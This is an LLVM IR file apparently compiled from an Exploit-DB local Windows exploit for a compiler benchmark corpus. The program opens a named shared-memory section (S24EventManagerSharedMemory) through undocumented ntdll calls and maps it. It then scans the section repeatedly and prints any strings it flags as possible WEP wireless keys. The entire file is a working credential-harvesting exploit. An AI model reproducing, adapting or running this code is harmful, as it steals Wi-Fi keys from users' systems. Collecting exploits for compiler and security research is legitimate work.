; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_1772.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_1772.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_5__ = type { %struct.TYPE_4__ }
%struct.TYPE_4__ = type { i32 }

@.str = private unnamed_addr constant [10 x i8] c"ntdll.dll\00", align 1
@.str.1 = private unnamed_addr constant [14 x i8] c"NtOpenSection\00", align 1
@.str.2 = private unnamed_addr constant [15 x i8] c"NtQuerySection\00", align 1
@.str.3 = private unnamed_addr constant [46 x i32] [i32 92, i32 66, i32 97, i32 115, i32 101, i32 78, i32 97, i32 109, i32 101, i32 100, i32 79, i32 98, i32 106, i32 101, i32 99, i32 116, i32 115, i32 92, i32 83, i32 50, i32 52, i32 69, i32 118, i32 101, i32 110, i32 116, i32 77, i32 97, i32 110, i32 97, i32 103, i32 101, i32 114, i32 83, i32 104, i32 97, i32 114, i32 101, i32 100, i32 77, i32 101, i32 109, i32 111, i32 114, i32 121, i32 0], align 4
@SECTION_MAP_READ = common dso_local global i32 0, align 4
@SECTION_QUERY = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [30 x i8] c"Section opened successfully.\0A\00", align 1
@FILE_MAP_READ = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [22 x i8] c"Scanning section...\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [42 x i8] c"\0ASNAPSHOT ID[%d]----------------[BEGIN]\0A\0A\00", align 1
@.str.7 = private unnamed_addr constant [23 x i8] c" String collected: %s\0A\00", align 1
@.str.8 = private unnamed_addr constant [45 x i8] c"### Possible Alphanumeric WEP KEY found: %s\0A\00", align 1
@.str.9 = private unnamed_addr constant [47 x i8] c"### Possible WEP KEY found(Ascii/HexMode): %s\0A\00", align 1
@.str.10 = private unnamed_addr constant [39 x i8] c"\0ASNAPSHOT ID[%d]----------------[END]\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.TYPE_5__, align 4
  %8 = alloca i64 (i32*, i32, %struct.TYPE_5__*, i32, i32)*, align 8
  %9 = alloca i32 (i32**, i32, i32*)*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca [256 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %18 = call i32 @LoadLibrary(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0))
  %19 = call i64 @GetProcAddress(i32 %18, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0))
  %20 = inttoptr i64 %19 to i32 (i32**, i32, i32*)*
  store i32 (i32**, i32, i32*)* %20, i32 (i32**, i32, i32*)** %9, align 8
  %21 = call i32 @LoadLibrary(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0))
  %22 = call i64 @GetProcAddress(i32 %21, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0))
  %23 = inttoptr i64 %22 to i64 (i32*, i32, %struct.TYPE_5__*, i32, i32)*
  store i64 (i32*, i32, %struct.TYPE_5__*, i32, i32)* %23, i64 (i32*, i32, %struct.TYPE_5__*, i32, i32)** %8, align 8
  %24 = call i32 @InitializeUnicodeStr(i32* %12, i8* bitcast ([46 x i32]* @.str.3 to i8*))
  %25 = call i32 @InitializeObjectAttributes(i32* %6, i32* %12, i32* null, i32* null, i32* null)
  %26 = load i32 (i32**, i32, i32*)*, i32 (i32**, i32, i32*)** %9, align 8
  %27 = load i32, i32* @SECTION_MAP_READ, align 4
  %28 = load i32, i32* @SECTION_QUERY, align 4
  %29 = or i32 %27, %28
  %30 = call i32 %26(i32** %17, i32 %29, i32* %6)
  %31 = load i32*, i32** %17, align 8
  %32 = icmp eq i32* %31, null
  br i1 %32, label %33, label %35

33:                                               ; preds = %2
  %34 = call i32 (...) @ShowError()
  br label %35

35:                                               ; preds = %33, %2
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.4, i64 0, i64 0))
  %37 = load i32*, i32** %17, align 8
  %38 = load i32, i32* @FILE_MAP_READ, align 4
  %39 = call i32* @MapViewOfFile(i32* %37, i32 %38, i32 0, i32 0, i32 0)
  store i32* %39, i32** %13, align 8
  %40 = load i32*, i32** %13, align 8
  %41 = icmp eq i32* %40, null
  br i1 %41, label %42, label %44

42:                                               ; preds = %35
  %43 = call i32 (...) @ShowError()
  br label %44

44:                                               ; preds = %42, %35
  %45 = load i64 (i32*, i32, %struct.TYPE_5__*, i32, i32)*, i64 (i32*, i32, %struct.TYPE_5__*, i32, i32)** %8, align 8
  %46 = load i32*, i32** %17, align 8
  %47 = call i64 %45(i32* %46, i32 0, %struct.TYPE_5__* %7, i32 4, i32 0)
  %48 = icmp ne i64 %47, 0
  br i1 %48, label %49, label %51

49:                                               ; preds = %44
  %50 = call i32 (...) @ShowError()
  br label %51

51:                                               ; preds = %49, %44
  %52 = load i32*, i32** %13, align 8
  %53 = bitcast i32* %52 to i8*
  store i8* %53, i8** %10, align 8
  %54 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.5, i64 0, i64 0))
  br label %55

55:                                               ; preds = %160, %51
  %56 = load i32, i32* %16, align 4
  %57 = icmp slt i32 %56, 100
  br i1 %57, label %58, label %164

58:                                               ; preds = %55
  %59 = load i32, i32* %16, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %16, align 4
  %61 = load i32, i32* %16, align 4
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.6, i64 0, i64 0), i32 %61)
  store i32 0, i32* %14, align 4
  br label %63

63:                                               ; preds = %157, %58
  %64 = load i32, i32* %14, align 4
  %65 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %7, i32 0, i32 0
  %66 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %65, i32 0, i32 0
  %67 = load i32, i32* %66, align 4
  %68 = icmp slt i32 %64, %67
  br i1 %68, label %69, label %160

69:                                               ; preds = %63
  %70 = load i8*, i8** %10, align 8
  %71 = load i32, i32* %14, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds i8, i8* %70, i64 %72
  %74 = load i8, i8* %73, align 1
  %75 = sext i8 %74 to i32
  %76 = icmp sgt i32 %75, 41
  br i1 %76, label %77, label %156

77:                                               ; preds = %69
  br label %78

78:                                               ; preds = %105, %77
  %79 = load i8*, i8** %10, align 8
  %80 = load i32, i32* %14, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8, i8* %79, i64 %81
  %83 = load i8, i8* %82, align 1
  %84 = sext i8 %83 to i32
  %85 = icmp ne i32 %84, 0
  br i1 %85, label %86, label %108

86:                                               ; preds = %78
  %87 = load i8*, i8** %10, align 8
  %88 = load i32, i32* %14, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8, i8* %87, i64 %89
  %91 = load i8, i8* %90, align 1
  %92 = sext i8 %91 to i32
  %93 = icmp sge i32 %92, 48
  br i1 %93, label %94, label %105

94:                                               ; preds = %86
  %95 = load i8*, i8** %10, align 8
  %96 = load i32, i32* %14, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8, i8* %95, i64 %97
  %99 = load i8, i8* %98, align 1
  %100 = load i32, i32* %15, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 %101
  store i8 %99, i8* %102, align 1
  %103 = load i32, i32* %15, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %15, align 4
  br label %105

105:                                              ; preds = %94, %86
  %106 = load i32, i32* %14, align 4
  %107 = add nsw i32 %106, 1
  store i32 %107, i32* %14, align 4
  br label %78

108:                                              ; preds = %78
  %109 = load i32, i32* %15, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %15, align 4
  %111 = sext i32 %109 to i64
  %112 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 %111
  store i8 0, i8* %112, align 1
  %113 = load i32, i32* %15, align 4
  %114 = icmp sgt i32 %113, 3
  br i1 %114, label %115, label %124

115:                                              ; preds = %108
  %116 = load i32, i32* %15, align 4
  %117 = icmp ne i32 %116, 14
  br i1 %117, label %118, label %124

118:                                              ; preds = %115
  %119 = load i32, i32* %15, align 4
  %120 = icmp ne i32 %119, 27
  br i1 %120, label %121, label %124

121:                                              ; preds = %118
  %122 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %123 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.7, i64 0, i64 0), i8* %122)
  br label %124

124:                                              ; preds = %121, %118, %115, %108
  %125 = load i32, i32* %15, align 4
  %126 = icmp eq i32 %125, 14
  br i1 %126, label %127, label %130

127:                                              ; preds = %124
  %128 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %129 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.8, i64 0, i64 0), i8* %128)
  br label %130

130:                                              ; preds = %127, %124
  %131 = load i32, i32* %15, align 4
  %132 = icmp eq i32 %131, 27
  br i1 %132, label %133, label %155

133:                                              ; preds = %130
  %134 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %135 = load i8, i8* %134, align 16
  %136 = sext i8 %135 to i32
  %137 = icmp ne i32 %136, 48
  br i1 %137, label %138, label %151

138:                                              ; preds = %133
  %139 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 2
  %140 = load i8, i8* %139, align 2
  %141 = sext i8 %140 to i32
  %142 = icmp ne i32 %141, 48
  br i1 %142, label %143, label %151

143:                                              ; preds = %138
  %144 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 6
  %145 = load i8, i8* %144, align 2
  %146 = sext i8 %145 to i32
  %147 = icmp ne i32 %146, 48
  br i1 %147, label %148, label %151

148:                                              ; preds = %143
  %149 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %150 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.9, i64 0, i64 0), i8* %149)
  br label %154

151:                                              ; preds = %143, %138, %133
  %152 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %153 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.7, i64 0, i64 0), i8* %152)
  br label %154

154:                                              ; preds = %151, %148
  br label %155

155:                                              ; preds = %154, %130
  store i32 0, i32* %15, align 4
  br label %156

156:                                              ; preds = %155, %69
  br label %157

157:                                              ; preds = %156
  %158 = load i32, i32* %14, align 4
  %159 = add nsw i32 %158, 1
  store i32 %159, i32* %14, align 4
  br label %63

160:                                              ; preds = %63
  %161 = load i32, i32* %16, align 4
  %162 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.10, i64 0, i64 0), i32 %161)
  %163 = call i32 @Sleep(i32 1000)
  br label %55

164:                                              ; preds = %55
  %165 = load i32*, i32** %17, align 8
  %166 = call i32 @CloseHandle(i32* %165)
  ret i32 0
}

declare dso_local i64 @GetProcAddress(i32, i8*) #1

declare dso_local i32 @LoadLibrary(i8*) #1

declare dso_local i32 @InitializeUnicodeStr(i32*, i8*) #1

declare dso_local i32 @InitializeObjectAttributes(i32*, i32*, i32*, i32*, i32*) #1

declare dso_local i32 @ShowError(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32* @MapViewOfFile(i32*, i32, i32, i32, i32) #1

declare dso_local i32 @Sleep(i32) #1

declare dso_local i32 @CloseHandle(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
